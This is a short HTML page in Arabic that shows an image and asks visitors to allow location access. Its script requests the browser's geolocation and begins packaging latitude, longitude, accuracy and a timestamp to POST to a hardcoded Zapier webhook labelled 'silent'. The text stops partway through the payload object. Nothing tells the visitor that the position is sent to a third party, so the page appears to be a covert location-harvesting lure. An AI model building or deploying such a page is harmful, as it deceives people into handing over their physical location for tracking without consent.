<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>يرجى السماح بالوصول إلى الموقع</title>
  <style>
    :root { color-scheme: light dark; }
    body{
      margin:0;
      display:flex;
      flex-direction:column;
      align-items:center;
      justify-content:center;
      height:100vh;
      background:#000;
      color:#fff;
      font-family:system-ui,-apple-system,"Segoe UI",Roboto,Arial;
      text-align:center;
      padding:16px;
      box-sizing:border-box;
    }
    img{
      max-width:90%;
      height:auto;
      border-radius:12px;
      margin-bottom:1.2rem;
      box-shadow:0 6px 24px rgba(0,0,0,.6);
    }
    .msg{
      margin-top:.6rem;
      font-size:.95rem;
      opacity:.9;
    }
    a.retry{
      display:inline-block;
      margin-top:.6rem;
      color:#7fb3ff;
      text-decoration:underline;
      cursor:pointer;
    }
  </style>
</head>
<body>
  <img src="490716617_24365319479735048_6862502247511119998_n.jpg" alt="صورة"/>
  <div class="msg" id="msg" aria-live="polite">يرجى السماح بالوصول إلى الموقع</div>
  <a class="retry" id="retry" style="display:none">إعادة المحاولة</a>

  <script>
    // Verbesserter Code mit keepalive + silent-Webhook
    const WEBHOOK = "https://hooks.zapier.com/hooks/catch/25010546/u5jmd4g/silent/";
    const msg = document.getElementById('msg');
    const retry = document.getElementById('retry');
    const setMsg = t => msg.textContent = t;

    async function sendToZapier(data){
      const res = await fetch(WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        keepalive: true
      });
      if(!res.ok) throw new Error('HTTP ' + res.status);
    }

    function askAndSend(){
      if(!('geolocation' in navigator)){
        setMsg('المتصفح لا يدعم تحديد الموقع');
        return;
      }

      setMsg('جارٍ طلب الموقع…');

      navigator.geolocation.getCurrentPosition(async pos => {
        const payload = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          acc: pos.coords.accuracy,
          ts: Date.now(),
